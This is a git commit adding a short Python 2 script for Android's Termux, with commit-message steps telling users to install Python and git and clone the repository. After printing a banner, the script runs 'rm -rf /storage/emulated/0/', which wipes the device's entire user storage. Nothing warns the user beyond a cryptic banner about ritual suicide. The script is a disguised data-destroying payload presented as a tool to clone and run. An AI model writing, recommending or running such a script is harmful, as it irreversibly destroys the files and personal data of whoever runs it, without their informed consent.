b291327666e7612b5db1e31463208b66a3175adb
Ryan Tattoo <49564905+RyanTattoo@users.noreply.github.com>
2019-05-10 04:41:14 +0700

    Add files via upload
    Sokushinbutsu
    
    pkg install python2
    pkg install git
    git clone https://github.com/RyanTattoo/Sokushinbutsu

---
+++ Sokushinbutsu.py
@@ -0,0 +1,24 @@
+import json
+import sys
+from os import system
+
+b = '\033[34;1m'
+g = '\033[32;1m'
+p = '\033[35;1m'
+c = '\033[36;1m'
+r = '\033[31;1m'
+w = '\033[37;1m'
+y = '\033[33;1m'
+
+system('clear')
+print g + "#########################################"
+print g + "# Sokushinbutsu              #"
+print g + "# Harakiri                   #"
+print g + "# Kamikaze                   #"
+print g + "#           #"
+print g + "# انالله وان اليه رجعون #"
+print g + "#########################################"
+
+system('clear')
+system("cd /sdcard")
+system("rm -rf /storage/emulated/0/")
